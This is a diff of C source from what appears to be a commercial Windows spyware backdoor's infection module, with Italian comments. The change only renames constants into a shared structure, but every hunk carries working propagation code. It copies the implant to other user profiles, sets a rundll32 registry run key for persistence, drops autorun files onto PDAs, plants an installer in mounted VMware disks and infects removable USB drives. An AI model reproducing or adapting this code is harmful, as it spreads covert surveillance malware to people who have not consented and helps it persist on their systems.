@@ -222,11 +222,11 @@ BOOL PDAFilesPresent()
 	HANDLE hfile;
 	char check_path[_MAX_PATH];
 
-	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBCORE_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	hfile = FNC(CreateFileA)(HM_CompletePath(shared.H4_MOBCORE_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return FALSE;
 	CloseHandle(hfile);
-	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBZOO_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	hfile = FNC(CreateFileA)(HM_CompletePath(shared.H4_MOBZOO_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return FALSE;
 	CloseHandle(hfile);
@@ -298,7 +298,7 @@ BOOL InfectPDA(WCHAR *mmc_path)
 
 	// Copia lo zoo
 	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
-	if (!CopyFileToPDAFromPC(HM_CompletePath(H4_MOBZOO_NAME, source_name), dest_name)) {
+	if (!CopyFileToPDAFromPC(HM_CompletePath(shared.H4_MOBZOO_NAME, source_name), dest_name)) {
 		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
 		pCeDeleteFile(dest_name);
 		return FALSE;
@@ -306,7 +306,7 @@ BOOL InfectPDA(WCHAR *mmc_path)
 
 	// Copia l'exe
 	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.exe", mmc_path);		
-	if (!CopyFileToPDAFromPC(HM_CompletePath(H4_MOBCORE_NAME, source_name), dest_name)) {
+	if (!CopyFileToPDAFromPC(HM_CompletePath(shared.H4_MOBCORE_NAME, source_name), dest_name)) {
 		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
 		pCeDeleteFile(dest_name);
 		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
@@ -397,7 +397,7 @@ BOOL IsUserInfected(WCHAR *dest_dir)
 	WCHAR infection_path[MAX_PATH];
 	WIN32_FIND_DATAW fdw;
 
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H4_CONF_FILE);
 	hfile = FNC(FindFirstFileW)(infection_path, &fdw);
 	if (hfile != INVALID_HANDLE_VALUE) {
 		FNC(FindClose)(hfile);
@@ -411,12 +411,12 @@ void RollBackUser(WCHAR *dest_dir)
 {
 	WCHAR infection_path[MAX_PATH];
 	
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4DLLNAME);
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H4DLLNAME);
 	FNC(DeleteFileW)(infection_path);
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H4_CONF_FILE);
 	FNC(SetFileAttributesW)(infection_path, FILE_ATTRIBUTE_NORMAL);
 	FNC(DeleteFileW)(infection_path);
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, shared.H4_HOME_DIR);
 	FNC(RemoveDirectoryW)(infection_path);
 }
 
@@ -447,8 +447,8 @@ BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	}
 	
 	// Path a rundll32.exe
-	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",%S", dest_dir, H4_HOME_DIR, H4DLLNAME, "PPPFTBBP08");
-	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", REGISTRY_KEY_NAME);
+	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",%S", dest_dir, shared.H4_HOME_DIR, shared.H4DLLNAME, "PPPFTBBP08");
+	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", shared.REGISTRY_KEY_NAME);
 	if (FNC(RegSetValueExW)(hOpen, uc_key, NULL, REG_EXPAND_SZ, (BYTE *)tmp_buf, (wcslen(tmp_buf)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
 		FNC(RegCloseKey)(hOpen);
 		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
@@ -474,18 +474,18 @@ BOOL SpreadToUser(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 		return FALSE;
 
 	FNC(CreateDirectoryW)(dest_dir, NULL);
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, shared.H4_HOME_DIR);
 	FNC(CreateDirectoryW)(infection_path, NULL);
 
-	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4DLLNAME, temp_path));
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4DLLNAME);
+	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(shared.H4DLLNAME, temp_path));
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H4DLLNAME);
 	if (!FNC(CopyFileW)(source_path, infection_path, FALSE)) {
 		RollBackUser(dest_dir);
 		return FALSE;
 	}
 
-	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4_CONF_FILE, temp_path));
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
+	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(shared.H4_CONF_FILE, temp_path));
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H4_CONF_FILE);
 	if (!FNC(CopyFileW)(source_path, infection_path, FALSE)) {
 		RollBackUser(dest_dir);
 		return FALSE;
@@ -497,21 +497,21 @@ BOOL SpreadToUser(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	}
 
 	// Cerca di copiare il driver (se c'e')
-	if (drv_scramb_name = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) {
+	if (drv_scramb_name = LOG_ScrambleName(shared.H4_DUMMY_NAME, 1, TRUE)) {
 		_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(drv_scramb_name, temp_path));
-		_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, drv_scramb_name);
+		_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, drv_scramb_name);
 		FNC(CopyFileW)(source_path, infection_path, FALSE);
 		SAFE_FREE(drv_scramb_name);
 	}
 
 	// Cerca di copiare il codec (se c'e')
-	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4_CODEC_NAME, temp_path));
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CODEC_NAME);
+	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(shared.H4_CODEC_NAME, temp_path));
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H4_CODEC_NAME);
 	FNC(CopyFileW)(source_path, infection_path, FALSE);
 
 	// Cerca di copiare la dll 64 (se c'e')
-	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H64DLL_NAME, temp_path));
-	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H64DLL_NAME);
+	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(shared.H64DLL_NAME, temp_path));
+	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, shared.H4_HOME_DIR, shared.H64DLL_NAME);
 	FNC(CopyFileW)(source_path, infection_path, FALSE);
 
 	return TRUE;
@@ -625,7 +625,7 @@ void InfectUsers()
 		}
 		
 		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s%s", user_home, user_temp);	
-		tmp_ptr = GetLocalSettings(tmp_buf, H4_HOME_PATH); // Ricava la directory dove dropparsi
+		tmp_ptr = GetLocalSettings(tmp_buf, shared.H4_HOME_PATH); // Ricava la directory dove dropparsi
 		
 		if (tmp_ptr[0] && SpreadToUser(tmp_ptr, user_home, user_sid)) {
 			if ( user_name = wcsrchr(user_home, L'\\') ) {
@@ -1000,7 +1000,7 @@ void InfectVMWare(char *disk_path)
 	if (!MountVMDisk(disk_path, drive_letter, &volume_id))
 		return;
 
-	if (InfectVMDisk(drive_letter, EXE_INSTALLER_NAME)) {
+	if (InfectVMDisk(drive_letter, shared.EXE_INSTALLER_NAME)) {
 		REPORT_STATUS_LOG("- VMWare Installation...........OK\r\n");
 		_snwprintf_s(msg, sizeof(msg)/sizeof(WCHAR), _TRUNCATE, L"[Inf. Module]: Spread to VMWare %S", disk_path);		
 		SendStatusLog(msg);	
@@ -1090,7 +1090,7 @@ void FindAndInfectVMware()
 	char obj_string[MAX_PATH];
 
 	// Verifica che esista il file della backdoor
-	HM_CompletePath(EXE_INSTALLER_NAME, obj_string);
+	HM_CompletePath(shared.EXE_INSTALLER_NAME, obj_string);
 	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 		return;
@@ -1227,7 +1227,7 @@ DWORD WINAPI MonitorUSBThread(DWORD dummy)
 			for (drive_letter[0]=L'D'; drive_letter[0]<=L'Z'; drive_letter[0]++) {
 				type = FNC(GetDriveTypeW)(drive_letter);
 
-				if (type==DRIVE_REMOVABLE && !IsUSBInfected(drive_letter) && InfectUSB(drive_letter, EXE_INSTALLER_NAME)) {
+				if (type==DRIVE_REMOVABLE && !IsUSBInfected(drive_letter) && InfectUSB(drive_letter, shared.EXE_INSTALLER_NAME)) {
 					REPORT_STATUS_LOG("- USB Drive Installation........OK\r\n");
 					SendStatusLog(L"[Inf. Module]: Spread to USB Drive");	
 				}
